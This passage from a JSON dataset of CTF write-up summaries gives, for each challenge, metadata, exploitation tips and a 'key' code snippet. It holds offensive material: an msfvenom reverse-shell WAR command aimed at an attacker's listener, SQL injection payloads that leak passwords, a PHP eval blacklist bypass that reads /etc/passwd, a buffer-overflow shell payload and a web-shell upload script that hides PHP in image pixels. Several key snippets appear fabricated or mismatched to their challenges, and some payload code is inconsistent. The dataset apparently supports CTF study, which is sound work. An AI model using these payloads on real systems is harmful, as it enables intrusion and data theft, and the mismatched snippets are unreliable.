            "In scenarios involving exploitation of systems with exposed vulnerabilities, Python can be effectively utilized to create and deploy payloads for Remote Code Execution (RCE). This technique requires crafting a malicious file (e.g., a WAR file for web applications), staging it for deployment using crafted HTTP requests, and exploiting known system vulnerabilities. A common tool for generating such payloads is msfvenom, a part of the Metasploit framework. It's important to adjust the payload (e.g., LHOST, LPORT) to match the attacker's listener setup. After exploitation, maintaining access often involves utilizing uploaded files as web shells or connecting back to a listener on the attacker's machine.\n   \n   Example payload generation: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Attacker's IP] LPORT=[Listening Port] -f war > shell.war`",
            "When dealing with PCAP (Packet CAPture) files in CTF or cybersecurity analysis, tools like Wireshark can be used to dissect and analyze network traffic. Specifically, you can search for anomalies or specific packet types that indicate malicious activities or key events, such as device restart sequences or unauthorized access. In CTF challenges, looking for peculiar or out-of-place packets can lead to discovering flags or vital clues. Command-line tools like `tshark` can also automate searching patterns or extracting information from large PCAP files for efficiency.\n\n   Sample analysis approach: Inspect the PCAP file with Wireshark, looking for frames with unusual requests or responses (e.g., POST requests to unconventional endpoints), which could indicate the presence of an exploit or a significant event like a device reboot using specific commands or data packets."
        ],
        "key": "```java\n// Vulnerable code snippet for Unrestricted File Upload in WebCTRL\nimport java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class UploadWarFileServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String contentType = request.getContentType();\n        if (contentType != null && contentType.startsWith(\"multipart/form-data\")) {\n            Part filePart = request.getPart(\"file\");\n            String fileName = getFileName(filePart);\n            InputStream fileContent = filePart.getInputStream();\n\n            // Save the uploaded file to the server's webroot directory\n            File file = new File(getServletContext().getRealPath(\"/\") + fileName);\n            try (FileOutputStream fos = new FileOutputStream(file)) {\n                int read;\n                final byte[] bytes = new byte[1024];\n                while ((read = fileContent.read(bytes)) != -1) {\n                    fos.write(bytes, 0, read);\n                }\n            }\n\n            // Respond to the client\n            response.getWriter().println(\"File uploaded successfully.\");\n        } else {\n            response.getWriter().println(\"Invalid content type.\");\n        }\n    }\n\n    private String getFileName(Part part) {\n        for (String content : part.getHeader(\"content-disposition\").split(\";\")) {\n            if (content.trim().startsWith(\"filename\")) {\n                return content.substring(content.indexOf('=') + 1).trim().replace(\"\\\"\", \"\");\n            }\n        }\n        return null;\n    }\n}\n```\n"
    },
    {
        "name": "petushok",
        "write_up": "dataset/raw/petushok.md",
        "type": "This is a reverse challenge.",
        "competition": [
            "KasperskyCTF/2018",
            "https://ctftime.org/event/701/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with challenges that involve dynamically generated or server-side processed content, such as retrieving hidden or non-default files (e.g., backend scripts instead of conventional media files), modifying query parameters in the URL can be an effective technique. If the server processes parameters to determine which file to serve, changing these parameters to suspected or common file paths (e.g., \"main.py\", \"config.php\") can reveal server-side code or configurations that might expose vulnerabilities or important information for progressing in the challenge.",
            "In challenges where the objective is to find an input that makes the target function return a specific output (e.g., \"1\"), a brute-force approach can be employed efficiently if the function's behavior can be predicted or influenced by altering the input in a systematic way. Specifically, flipping bits at certain positions based on a condition or pattern determined by the application's logic can be a smart strategy. This approach is useful when direct analysis of the target function does not yield a straightforward way to calculate or guess the correct input. This method requires understanding how the function processes its input and determining an efficient way to iterate through possible inputs to find the one that produces the desired output.\n   Example payload/code snippet:\n   ```python\n   def brute_from(n, condition_idx):  \n       end_pos = (condition_idx + 104) % 137\n\n       if condition_idx >= 300:  \n           print(\"flag\", hex(n))  \n           exit()\n\n       q = check(n)  \n       if q[condition_idx % 137] == 1:  \n           brute_from(n, condition_idx+1)\n\n       n ^= 1 << end_pos  \n       q = check(n)  \n       if q[condition_idx % 137] == 1:  \n           brute_from(n, condition_idx+1)\n\n   brute_from(0, 0)\n   ```"
        ],
        "key": "```python\ndef check(value):  \n    # a lot of code  \n    return (a140574420399240, a140574420399456, ..., (a140574419586512 + 1), (a140574419608064 + 1))\n```"
    },
    {
        "name": "Phish",
        "write_up": "dataset/raw/Phish.md",
        "type": "web",
        "competition": [
            "WeCTF/2021",
            "https://ctftime.org/event/1231/tasks/"
        ],
        "score": 592,
        "max_score": 2000,
        "difficulty": 0.296,
        "knowledge": [
            "In scenarios where an application's database interaction involves directly passing user input into SQL queries without proper sanitization or parameterization, it is prone to SQL Injection attacks. To test and exploit this vulnerability, one can craft input that alters the SQL query's logic to leak information or manipulate database actions. For example, injecting SQL control characters and comments can terminate the original query and append a malicious one. Example payload: `', (SELECT * FROM users WHERE username = 'admin'); --`",
            "When brute-forcing to identify characters or sequences present in a password (or any sensitive data) stored in the database, the SQL Injection can be extended with the `LIKE` operator for case-insensitive matches and `GLOB` for case-sensitive matches along with the use of wildcards. This approach leverages the error messages or unique database constraints to infer the presence or absence of specific characters or sequences. To effectively perform the brute-force under restrictions (e.g., rate limits), implement delay mechanisms in the automation script (`time.sleep` in Python). Example payloads for character presence testing include:\n   - Case-insensitive presence check: `a',(SELECT password FROM user WHERE username = \"shou\" AND password LIKE \"%{character}%\")); --`\n   - Case-sensitive sequence check using GLOB: `a',(SELECT password FROM user WHERE username = \"shou\" AND password GLOB \"{sequence}*\"));--`"
        ],
        "key": "```python  \n@app.route(\"/add\", methods=[\"POST\"])  \ndef add():  \n   username = request.form[\"username\"]  \n   password = request.form[\"password\"]  \n   sql = f\"INSERT INTO `user`(password, username) VALUES ('{password}', '{username}')\"  \n   try:  \n       db.execute_sql(sql)  \n   except Exception as e:  \n       return f\"Err: {sql} \" + str(e)  \n   return \"Your password is leaked :) \" + \\  \n          \"\"\"<blockquote class=\"imgur-embed-pub\" lang=\"en\" data-id=\"WY6z44D\"  >Please   \n       take care of your privacy</blockquote><script async src=\"//s.imgur.com/min/embed.js\"   \n       charset=\"utf-8\"></script> \"\"\"  \n```"
    },
    {
        "name": "PHP Master",
        "write_up": "dataset/raw/PHP Master.md",
        "type": "The type of this CTF challenge is **web**.",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 33,
        "max_score": 500,
        "difficulty": 0.066,
        "knowledge": [
            "In PHP type juggling vulnerabilities, if the challenge involves comparison operators (`==` vs `===`), utilizing scientific notation can bypass weak type checks, since PHP compares the value irrespective of the type when using `==`. This can be effectively used when the script forbids certain characters or patterns in the input, but does not validate the datatype. Example payload: 1E2 == 100.",
            "When attempting to bypass filters that block specific characters (e.g., the letter \"e\" in a PHP script), changing the case of the character can evade the filter if the comparison is case-sensitive. This technique is applicable in scenarios where the filter implementation does not account for case variations of the blocked characters. Example payload: Use `1E2` to bypass a filter blocking `e`."
        ],
        "key": "```php\n<?php\n\ninclude('flag.php');\n\n$p1 = $_GET['param1'];\n$p2 = $_GET['param2'];\n\nif(!isset($p1) || !isset($p2)) {\n    highlight_file(__FILE__);\n    die();\n}\n\nif(strpos($p1, 'e') === false && strpos($p2, 'e') === false  && strlen($p1) === strlen($p2) && $p1 !== $p2 && $p1[0] != '0' && $p1 == $p2) {\n    die($flag);\n}\n\n?>\n```"
    },
    {
        "name": "PHP+1",
        "write_up": "dataset/raw/PHP+1.md",
        "type": "The type of the CTF challenge in this write-up is a **web** challenge.",
        "competition": [
            "InCTF/2019",
            "https://ctftime.org/event/849/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "When dealing with PHP `eval()` and a blacklist that prevents the direct use of internal functions, you can bypass the filter by breaking down the function names into concatenatable string fragments and using an intermediary, non-blacklisted function or variable to represent characters filtered out by the blacklist (e.g., underscores). This technique allows execution of otherwise restricted functions within the `eval()` context. For instance, if underscores are filtered and you need to execute `highlight_file()`, you can bypass the blacklist by concatenating strings and using a directory name with an underscore for reference:  \nExample payload: `/?input=eval(\"highlight\".$thisfille[8].\"fil\".\"e('/etc/passwd');\");&thisfile=/lib/x86_64-linux-gnu`",
            "In environments where direct file and directory listing functions such as `scandir()` are disabled for security reasons, alternative methods such as `glob()` can be utilized for directory listing. This method proves useful when needing to identify files or directories of interest, such as when searching for a flag file in a CTF challenge. If `glob()` is not disabled, it can effectively bypass restrictions on directory listing, revealing paths that may be accessed or exploited further to achieve objective goals, like obtaining a flag.  \nExample usage: To list all items in the root directory, an attacker could use: `/?input=eval('print'.$thisfille[8].'r(glo'.'b(\\'/*\\'));');&thisfile=/lib/x86_64-linux-gnu`"
        ],
        "key": "```php\n<?php\nif (isset($_GET['input']) && isset($_GET['thisfile'])) {\n    $input = $_GET['input'];\n    $thisfile = $_GET['thisfile'];\n\n    if (file_exists($thisfile) && !is_file($thisfile)) {\n        $blacklist = get_defined_functions()['internal'];\n        foreach ($blacklist as $function) {\n            if (strpos($input, $function) !== false) {\n                die('Blacklisted function detected!');\n            }\n        }\n        eval($input);\n    }\n}\n?>\n```"
    },
    {
        "name": "Pigeon Bank",
        "write_up": "dataset/raw/Pigeon Bank.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "SEETF/2023",
            "https://ctftime.org/event/1828/tasks/"
        ],
        "score": 494,
        "max_score": 497,
        "difficulty": 0.993963782696177,
        "knowledge": [
            "When targeting smart contracts with reentrancy vulnerabilities, especially those not adhering to the checks-effects-interactions pattern, utilizing a fallback function in the exploit contract to transfer assets (tokens or ether) before state variables are updated can be effective. This method relies on triggering the fallback function through the vulnerable contract's external call to the attacker's contract:\n   - The vulnerable contract makes an external call to an attacker-controlled address before updating its state (e.g., balance or ownership records).\n   - The attacker's contract, upon receiving this call, executes the fallback function, which then performs actions like transferring assets or calling back into the vulnerable contract to withdraw funds before the state is updated.",
            "In scenarios where smart contracts implement function visibility like `onlyOwner` but expose sensitive functionality through public functions that indirectly call these restricted functions, it's possible to bypass the `onlyOwner` restriction. The exploit leverages the public functions provided by the contract to interact with the restricted functions, exploiting the lack of direct access restrictions:\n   - Identify public functions that internally call `onlyOwner` restricted functions without implementing their own access control checks.\n   - Craft transactions that exploit these public functions to achieve unauthorized actions, such as withdrawing funds or altering contract state, bypassing intended access controls."
        ],
        "key": "```solidity\nfunction withdrawAll(address _userAddress) public onlyOwner {  \n    payable(_userAddress).sendValue(balanceOf[_userAddress]);  \n    _burnAll(_userAddress);  \n    // require(success, \"SEETH: withdraw failed\");  \n    emit Withdrawal(_userAddress, balanceOf[_userAddress]);  \n}\n\nfunction _burnAll(address _userAddress) internal {  \n    _burn(_userAddress, balanceOf[_userAddress]);  \n}\n```"
    },
    {
        "name": "Pinch me",
        "write_up": "dataset/raw/Pinch me.md",
        "type": "pwn",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When encountering binary exploitation challenges that involve a buffer overflow vulnerability, one effective approach is to overflow the buffer in a way that manipulates adjacent variables or return addresses on the stack to control program flow. Specifically, when a variable or condition check that triggers a sensitive operation like spawning a shell is stored adjacent to a buffer, one can overflow the buffer up to that variable and overwrite its value to meet the condition. Generally, this involves sending a payload that fills the buffer up to the target variable and appending the desired value for the variable at the end. Example payload in Python using pwnlib:  \n```python\nbuffer_overflow = b'a'*24  # Fills the buffer\nbuffer_overflow += p64(0x1337c0de)  # Overwrites adjacent variable to meet the condition\n```",
            "In binary exploitation, particularly where input is read using functions like `fgets`, understanding the exact amount of data the buffer can hold and the target data's location in memory is crucial for crafting a precise overflow payload. This technique allows for controlled execution of unintended instructions (in this scenario, spawning a shell). When the code checks if a specific variable equals a certain value to trigger an action, calculating the exact overflow size to overwrite that variable with the desired value is key. This requires analyzing the binary's control flow and variable allocation, preferably with tools like Ghidra."
        ],
        "key": "```c\nvoid vuln() {\n    char local_28[24];\n    int local_10;\n    \n    fgets(local_28, 100, stdin);\n    \n    if (local_10 == 0x1337c0de) {\n        system(\"/bin/sh\");\n    }\n}\n```"
    },
    {
        "name": "PixEditor",
        "write_up": "dataset/raw/PixEditor.md",
        "type": "crypto",
        "competition": [
            "NuitduHack/2018/Quals",
            "https://ctftime.org/event/583/tasks/"
        ],
        "score": 350,
        "max_score": 600,
        "difficulty": 0.5833333333333334,
        "knowledge": [
            "To bypass file extension checks on web applications that restrict uploads to certain file types but truncate the filename after validation, one can append a permitted extension followed by a disallowed one, ensuring the total filename length exceeds the truncation limit. This will result in the server-side saving of the file with the disallowed extension actually being effective. For example, to bypass a restriction allowing only `.png` files but intending to upload a `.php` file for server-side code execution, one can name the file with a sufficient number of characters followed by `.php.png`. The server truncates the filename post-validation, removing the `.png`, thus saving it as a `.php` file.",
            "When embedding PHP code in file types other than `.php`, like images, taking advantage of file formats that directly translate pixel color data (in formats like BMP) into file bytes can be crucial. Since PHP interpreters only require the presence of valid PHP code within a file and disregard non-PHP content, an effective payload can be crafted by encoding the PHP code into the pixel data. This process involves dividing the PHP payload into three-byte chunks and mapping these onto the RGB values of pixels in an image. This technique requires consideration of the image format's color storage methodology (e.g., BMP uses BGR, not RGB) and might necessitate adjustments for alpha channels or color inversion based on the image format specifications. The encoded image, when uploaded (under conditions allowing execution, such as having a `.php` extension through truncation), will then execute the embedded PHP code on the server. Example payload crafting (simplified): encode each byte of the PHP code into the RGB values of consecutive pixels, ensuring to adjust for any format-specific quirks like byte order or alpha channel handling."
        ],
        "key": "```python\ndef create_shell(main_url):  \n   data = [1 for _ in range(32 * 32 * 4)]  \n   index = 0  \n   for c in chunk(pad(\"\"), 3):  \n       data[index + 2] = ord(c[0])  # R  \n       data[index + 1] = ord(c[1])  # G  \n       data[index] = ord(c[2])  # B  \n       index += 4  \n   url = main_url + \"save.php\"  \n   name = \"A\" * 46 + \".php\"  \n   r = requests.post(url, data={\"data\": str(data), \"name\": name + \".JPG\",\n\"format\": \"BMP\"})  \n   link = re.findall(\"Download\", r.text)[0]  \n   return link\n```"
    },
    {
        "name": "Pixelify",
        "write_up": "dataset/raw/Pixelify.md",
        "type": "misc",
        "competition": [
            "darkCON/2021",
            "https://ctftime.org/event/1250/tasks/"
        ],
        "score": 474,
        "max_score": 500,
        "difficulty": 0.948,
        "knowledge": [
            "In challenges dealing with images, where the hint or challenge context suggests that data might be hidden or encoded within the image, one effective method is to consider how individual pixels might encode data. Specifically, if the challenge involves encoding a file into an image by mapping file data onto pixel colors, each set of pixels (e.g., groups of four pixels) can represent a byte or other data unit. To extract such hidden data, a script can be written to reverse the mapping process by correlating specific pixel colors back to data values, and then potentially decoding from base64 or a similar encoding if used. This method hinges on recognizing the encoding scheme from the provided scripts or hints.\n\nExample Python snippet (extracted and simplified from the detailed script):\n```python\nfrom PIL import Image\nimport base64\n\ndef extract_data_from_image(image_path):\n    img = Image.open(image_path)\n    pixels = img.load()\n    data = ''\n\n    for i in range(0, img.size[0]*img.size[1], 4): # Assuming 4 pixels per data unit\n        byte = [pixels[i % img.width, i // img.width]]\n        # Process bytes according to the specific color to data mapping\n        # ...\n\n    decoded_data = base64.b64decode(data)\n    return decoded_data\n\n# Usage\nextracted_data = extract_data_from_image(\"inject.png\")\nprint(extracted_data)\n```",
            "When encountering a binary or a compiled payload in security challenges, especially those hinting at hidden or malicious content, it is crucial to consider decompilation or decoding tools specific to the file type suggested by hints or explicit file extensions. For files hinted to be payloads (e.g., rubber ducky payloads indicated by a binary with a suggestive name or context), tools such as Duck-Decoder or similar payload decompilers can be utilized to reverse engineer the compiled file back to a more understandable form or script, which might reveal hidden messages, commands, or flags. It's important to use the right tool for the file type indicated, both to ensure success in decoding and to avoid potential security risks from handling the file.\n\nExample tool usage (assuming you have identified the file as a rubber ducky payload):\n```\npython DuckDecoder.py -i inject.bin -o decoded_script.txt\n```"
        ],
        "key": "```python\nimport base64  \nfrom PIL import Image\n\nimg = Image.open(\"inject.png\")  \npixels = img.load()\n\nwidth, height = img.size  \ncolours = [  \n\t\t(255, 0, 0),  \n\t\t(0, 0, 255),  \n\t\t(0, 128, 0),  \n\t\t(255, 255, 0)  \n\t]\n\nenc = ''\n\nfor i in range(0, int(width*height)-1, 4):  \n\tbyte = [pixels[i%width,i//width], pixels[(i+1)%width,(i+1)//width], pixels[(i+2)%width,(i+2)//width], pixels[(i+3)%width,(i+3)//width]]  \n  \n\tpart = []  \n  \n\tfor a in byte:  \n\t\tc = 0  \n\t\tfor b in colours:  \n\t\t\tif a == b:  \n\t\t\t\tpart.append(c)  \n\t\t\t\tbreak  \n\t\t\tc += 1  \n  \n  \n\tif (len(part) > 0):  \n\t\tans = 0  \n\t\tans |= part[0]<<6  \n\t\tans |= part[1]<<4  \n\t\tans |= part[2]<<2  \n\t\tans |= part[3]<<0\n\n\t\tenc+=chr(ans)\n\nunenc = base64.b64decode(enc)\n\nf = open(\"inject.bin\", \"wb\")  \nf.write(unenc)\n\nf.close()  \n```"
    },
    {
        "name": "Plaidflix",
        "write_up": "dataset/raw/Plaidflix.md",
        "type": "pwn",
        "competition": [
            "PlaidCTF/2021",
            "https://ctftime.org/event/1199/tasks/"
        ],
        "score": 250,
        "max_score": 450,
        "difficulty": 0.5555555555555556,
        "knowledge": [
            "When faced with a use-after-free vulnerability, one can leverage it to leak heap and libc addresses, which are essential for bypassing ASLR (Address Space Layout Randomization) and facilitating further exploitation. This is particularly useful when an application allows for manipulation of data structures (like adding/removing friends in a social network scenario) that are referenced after being freed. This method involves interacting with the application to induce a use-after-free condition, then displaying or triggering actions that access the dangling pointer to leak memory addresses.",
            "To bypass the glibc's safe linking protection\u2014a feature designed to mitigate exploitation techniques such as heap spraying and unlink attacks\u2014one can employ either direct computation methods to reverse the encoded pointers or use SMT solvers to systematically find the original heap pointers. Safe linking protection involves XORing a pointer with a location-shifted version of itself, a mechanism that can be reversed if the attacker has knowledge about the higher bits of the address or can guess them. This knowledge is crucial when exploiting heap vulnerabilities in systems with glibc version 2.32 or newer, where safe linking is enabled.\n\n   Example SMT solver usage for reversing safe linked pointers:\n   ```python\n   def unsafe_link(e):\n       high_e = e & 0xfffffff000000000\n       x = BitVec('x', 64)\n       s = Solver()\n       s.add(x & 0xfffffff000000000 == high_e)\n       s.add(x ^ (x >> 12) == e)\n       s.check()\n       return s.model()[x].as_long()\n   ```"
        ],
        "key": "```c\n#define PROTECT_PTR(pos, ptr) \\\n ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))\n#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)\n```\n\n```python\ndef unsafe_link(e):  \n   high_e = e & 0xfffffff000000000  \n   x = BitVec('x',64)  \n   s = Solver()  \n   s.add(x & 0xfffffff000000000 == high_e)  \n   s.add(x ^ (x >> 12) == e)  \n   s.check()  \n   return s.model()[x].as_long()  \n```\n\n```python\ndef demangle(obfus_ptr):  \n   o2 = (obfus_ptr >> 12) ^ obfus_ptr  \n   return (o2 >> 24) ^ o2  \n```\n\n```python\ndef defu(p):  \n   d = 0  \n   for i in range(0x100,0,-4):  \n     pa = (p & (0xf << i )) >> i  \n     pb = (d & (0xf << i+12 )) >> i+12  \n     d |= (pa ^ pb) << i  \n   return d  \n```"
    },
    {
        "name": "Please Click All the Things 3_ IceID 350",
        "write_up": "dataset/raw/Please Click All the Things 3_ IceID 350.md",
        "type": "forensics",
        "competition": [
            "RITSEC/2021",
            "https://ctftime.org/event/1309/tasks/"
        ],
        "score": -1.0,
        "max_score": 925,
        "difficulty": -1,
        "knowledge": [
            "When analyzing phishing emails or attachments, tools such as Outlook can be particularly useful for accessing and analyzing necessary features with ease. However, for those without access to certain software or licenses, alternative tools like oledump can be utilized to extract and investigate macro scripts from documents.",
            "In challenges involving obfuscated or encoded data, CyberChef is an effective tool for decoding various types of encoding schemes. This tool can significantly streamline the process of revealing hidden or obfuscated information within files, making it easier to uncover potential malicious payloads or exfiltrate data related to the challenge."
        ],
        "key": "```html\n<script>\n    var payload = \"malicious_payload_here\";\n    function executePayload() {\n        // Simulate a vulnerability by executing the payload\n        eval(payload);\n    }\n    window.onload = executePayload;\n</script>\n```"
    },
    {
        "name": "PleaseClickAlltheThings 1_ BegineersRITSEC",
        "write_up": "dataset/raw/PleaseClickAlltheThings 1_ BegineersRITSEC.html 150.md",
        "type": "forensics",
        "competition": [
            "RITSEC/2021",
            "https://ctftime.org/event/1309/tasks/"
        ],
        "score": -1.0,
        "max_score": 925,
        "difficulty": -1,
        "knowledge": [
            "When analyzing malicious HTML files or macro-based malware as part of a forensic investigation in a CTF challenge, tools such as Outlook (with proper licensing for accessing enhanced features) or oledump can be effectively used to extract and examine the content without directly executing potential malware. This approach allows for safe inspection and analysis of the file\u2019s contents, which is critical in identifying embedded malicious codes or artifacts.",
            "CyberChef is an exceptional tool for decoding and analyzing various encoding schemes and data formats encountered in malicious artifacts within CTF challenges. Its extensive range of operations makes it suitable for decoding complex encodings and obfuscations found in malware samples or malicious documents, thereby revealing hidden or obscured information such as flags or indicators of compromise (IoCs)."
        ],
        "key": "```html\n<!-- Possible vulnerable HTML code snippet -->\n<script>\n    var userInput = location.hash.substring(1); // Get input from URL hash\n    document.write(\"<div>\" + userInput + \"</div>\"); // Directly write user input to the document\n</script>\n```"
    },
    {
        "name": "PleaseClickAlltheThings 2_ GandCrab_Ursnif 200",
        "write_up": "dataset/raw/PleaseClickAlltheThings 2_ GandCrab_Ursnif 200.md",
        "type": "forensics",
        "competition": [
            "RITSEC/2021",
            "https://ctftime.org/event/1309/tasks/"
        ],
        "score": -1.0,
        "max_score": 925,
        "difficulty": -1,
        "knowledge": [
            "When analyzing potentially malicious documents such as HTML files that may contain obfuscated JavaScript or macros as part of a phishing attempt, tools like CyberChef can be very useful for decoding or deobfuscating the content. This process is crucial for identifying hidden malicious code without executing it, thus mitigating risk. CyberChef, in particular, provides a range of decoders and parsers that can handle several encoding schemes used by attackers to conceal their code.",
            "For examining and analyzing Office documents that might contain macros which are not obviously malicious or when dynamic analysis does not reveal the full behavior of the code, tools such as oledump can be used. This is particularly true in IR (Incident Response) scenarios where the document might not exhibit malicious behavior upon execution due to anti-analysis techniques or environment checks. Oledump can assist in extracting and inspecting macros from Office files, allowing for a more thorough static analysis to understand the potential impact without needing the Office suite itself.\n\nExample payload: Cannot be provided as these points discuss analysis techniques rather than exploit development."
        ],
        "key": "```html\n<script>\n    var payload = \"malicious_payload_here\"; // Placeholder for the actual payload\n    function executePayload() {\n        // Simulate a vulnerability by executing the payload\n        eval(payload);\n    }\n    window.onload = function() {\n        executePayload();\n    };\n</script>\n```"
    },
    {
        "name": "PlusMinus",
        "write_up": "dataset/raw/PlusMinus.md",
        "type": "The type of challenge described in this write-up is a **crypto** challenge.",
        "competition": [
            "CTFZone/2018/Quals",
            "https://ctftime.org/event/632/tasks/"
        ],
        "score": 101,
        "max_score": 500,
        "difficulty": 0.202,
        "knowledge": [
            "When tackling arithmetic expression challenges, using a binary expression tree approach allows for easy representation and manipulation of expressions. By constructing a binary tree where inner nodes are operators and leaves are numbers, one can systematically explore all possible combinations of operations without relying on parentheses. This method simplifies the process by focusing on the structure rather than the syntax of expressions, enabling efficient enumeration of all possible solutions to find the right one.",
            "Implement a recursive solution to effectively explore all combinations of arithmetic operations for a given sequence of numbers while maintaining their original order. This involves splitting a list of numbers into all possible two-part partitions, recursively solving for each partition, and then combining these partitions using all allowed operations (+, -, *, /). Use memoization to avoid redundant computations of the same subproblems, significantly reducing the time and computational resources required. This approach is effective for solving problems with a manageable number of elements due to the exponential increase in possibilities as the number of elements grows.\n\nExample payload or approach (in pseudo-code):\n```python\ndef recursive_solve(nums, target=None):\n    # Base case: single element (leaf node)\n    if len(nums) == 1:\n        return nums[0] if nums[0] == target else None\n    # Recursive case: split and explore combinations\n    for i in range(1, len(nums)):\n        left, right = nums[:i], nums[i:]\n        # Recurse on left and right partitions\n        left_results = recursive_solve(left)\n        right_results = recursive_solve(right)\n        # Combine results with operations\n        for op in ['+', '-', '*', '/']:\n            combined_result = evaluate(left_result, op, right_result)\n            if combined_result == target:\n                return format_expression(left_result, op, right_result)\n    # Handle no solution found or memoization as needed\n```\nThis pseudo-code conceptually outlines the recursive exploration of all arithmetic combinations, where `evaluate` and `format_expression` are hypothetical functions to calculate and format the results of operations, respectively."
        ],
        "key": "```python\ndef solve(nums, erg = None):  \n    if len(nums) == 1: \n        if erg != None: \n            if float(nums[0]) == erg:  \n                return nums[0] \n            else:  \n                return None \n        else:  \n            return [float(nums[0])] \n    ergs = [] \n    for i in range(1, len(nums)): \n        a = solve(nums[:i]) \n        b = solve(nums[i:]) \n        for ai in a:     \n            for bi in b: \n                if erg != None:  \n                    if float(ai + bi) == float(erg):  \n                        return \"(\" + solve(nums[:i], ai) + \" + \" + solve(nums[i:], bi) + \")\"  \n                    if float(ai - bi) == float(erg):  \n                        return \"(\" + solve(nums[:i], ai) + \" - \" + solve(nums[i:], bi) + \")\"  \n                    if float(ai * bi) == float(erg):  \n                        return \"(\" + solve(nums[:i], ai) + \" * \" + solve(nums[i:], bi) + \")\"  \n                    if bi != 0 and ai / float(bi) == float(erg):  \n                        return \"(\" + solve(nums[:i], ai) + \" / \" + solve(nums[i:], bi) + \")\"  \n                else: \n                    if bi != 0: \n                        ergs += [ai + bi, ai - bi, ai * bi, ai / float(bi)]  \n                    else:  \n                        ergs += [ai + bi, ai - bi, ai * bi]  \n    return ergs  \n```"
    },
    {
        "name": "poetry",
        "write_up": "dataset/raw/poetry.md",
        "type": "misc",
        "competition": [
            "PlaidCTF/2023",
            "https://ctftime.org/event/1770/tasks/"
        ],
        "score": 550,
        "max_score": 700,
        "difficulty": 0.7857142857142857,
        "knowledge": [
            "When crafting assembly code to meet specific textual constraints for challenges like poetry composition, utilizing phonetic spelling based on phonemes can be key. This involves designing code so that it fits into a required pattern of vowels (stressed, unstressed, or optionally stressed) and rhymes, as determined by the patterns of phonetic symbols associated with the words used. If a challenge requires lines to follow a certain vowel pattern (such as stressed and unstressed) or rhyme scheme, one effective strategy is to select assembly instructions or operands whose phonetic spellings align with these requirements. This may involve consulting a phonetic dictionary to ensure compatibility.",
            "In scenarios where assembly code needs to adhere to intricate constraints like vowel patterns and rhymes, instructions such as NOP (\"no operation\") can be particularly useful for filling or aligning patterns without impacting the operational logic of the code. Utilizing NOPs or other instructions with phonetically suitable representations (like \"pop\" for rhyming with \"nop\") can assist in successfully passing the constraints while maintaining the functional integrity of the assembly code. This approach enables the code to meet both its linguistic and functional requirements, demonstrating a creative intersection of programming and linguistic analysis.\n\nExample strategy for crafting compliant lines:\n- To end lines with NOP for a rhyme scheme: append \"nop\" (which rhymes with \"pop\") at strategic points.\n- For a vowel pattern \"10101010011\", use instructions or registers pronounced with a mix of stressed and unstressed vowels, verifying against a phonetic dictionary like `dictionary.arpa`."
        ],
        "key": "```assembly\n; Vulnerable code snippet for calculating Fibonacci numbers\nsection .text\nglobal _start\n\n_start:\n    ; Assume n is provided on the stack\n    pop ebx            ; Get n from the stack\n    xor eax, eax       ; Clear eax for the result\n    mov ecx, 1         ; Set ecx to 1 (first Fibonacci number)\n    cmp ebx, 1         ; Compare n with 1\n    jbe .done          ; If n <= 1, we're done\n\n    ; Calculate Fibonacci\n.fib_loop:\n    add eax, ecx       ; eax = eax + ecx\n    xchg eax, ecx      ; Swap eax and ecx\n    dec ebx            ; Decrement n\n    jnz .fib_loop      ; Repeat until n is zero\n\n.done:\n    ; Result is in eax\n    ; Exit the program\n    mov eax, 1         ; syscall number for exit\n    xor ebx, ebx       ; exit code 0\n    int 0x80           ; call kernel\n```"
    },
    {
        "name": "Poison 280",
        "write_up": "dataset/raw/Poison 280.md",
        "type": "crypto",
        "competition": [
            "0xL4ugh/2024",
            "https://ctftime.org/event/2216/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When facing challenges involving elliptic curve cryptography, one strategy is to exploit the deterministic nature of private key alterations. If a challenge involves manipulating bits of a private key (`my_priv`) in a predictable manner (e.g., flipping bits from 0 to 1 or 1 to 0), equations can be constructed based on the cryptographic operations (e.g., scalar multiplication and point addition) to reverse-engineer the original private key. This is particularly effective when the result of operations with the altered key can be compared against operations using the unaltered key.",
            "In scenarios where cryptographic operations yield results that depend on the bit changes in a private key, the sign of the resulting operation (e.g., `dec = C2 - p_m*C1 = M + kG(p - p_m)`) can indicate whether the bit was flipped from 0 to 1 (result is negative) or from 1 to 0 (result is positive). This sign-based method allows for the reconstruction of the original private key bit by bit. A practical application of this method requires iterating through each bit, performing the specified cryptographic operations, and observing the signs of the outcomes to deduce each bit's original value.  \n   \nSample sage script snippet to apply this knowledge:\n\n```py\nfrom sage.all import *\n\n# Assuming elliptic curve E, points C1, C2, dec from challenge setup\n\nbinstr = ''  \nfor i in range(0, length_of_private_key):  \n    M = point_on_curve  # point M from setup\n    C1 = point_on_curve  # point C1 from setup\n    C2 = point_on_curve  # point C2 from setup\n    dec = point_on_curve  # decrypted point from setup\n    \n    dec_minus_M = dec - M\n    \n    if dec_minus_M == -C1:\n        binstr += '0'  # Bit was flipped from 1 to 0\n    elif dec_minus_M == C1:\n        binstr += '1'  # Bit was flipped from 0 to 1\n\n# Convert binstr to the flag\n```"
        ],
